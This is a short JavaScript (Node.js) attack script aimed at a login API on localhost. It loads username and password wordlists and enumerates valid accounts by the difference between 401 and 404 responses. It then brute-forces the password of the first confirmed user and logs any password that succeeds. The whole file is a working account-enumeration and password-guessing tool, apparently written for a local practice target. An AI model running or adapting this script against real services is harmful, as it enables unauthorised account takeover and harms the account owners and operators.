const fs= require('fs')
 
const data=fs.readFileSync('./username_wordlists.txt', 'utf8').split('\n').map(name=>name.trim())
const pass=fs.readFileSync('./password_wordlist.txt', 'utf8').split('\n').map(pass=>pass.trim())
async function authentication(data){

    for(const username of data){
    try{
        const response=await fetch('http://localhost:3000/api/login',{
    method: 'POST',
    headers:{'content-type':'application/json'},
    body:JSON.stringify({username:username, password:'randmnessword'})
    })

    if(response.status===401){
        let confirmedtarget=username
        console.log(`${username} is the confirmed target with status: ${response.status}`)
        await password(confirmedtarget)
        return;
        
       
    }else if(response.status===404){
        console.log(`${username} does not exist status: ${response.status}`)
    }else{console.log(`Unexpected response for ${username}: ${response.status}`)}
        }catch(e){console.log(`something wrong happened:${e.message}`)}
        }
}

 async function password(targetUser){
            for(const password of pass){
        try{
            const response= await fetch('http://localhost:3000/api/login', {
                method:"POST",
                headers:{"content-type":"application/json"},
                body:JSON.stringify({username:targetUser, password:password})
            })
            if(response.status===200){
                console.log(`password for ${targetUser} is ${password} with status: ${response.status}`)
            }
        }catch(e){console.log(`something wrong happened:${e.message}`)}
            }
        }

authentication(data)
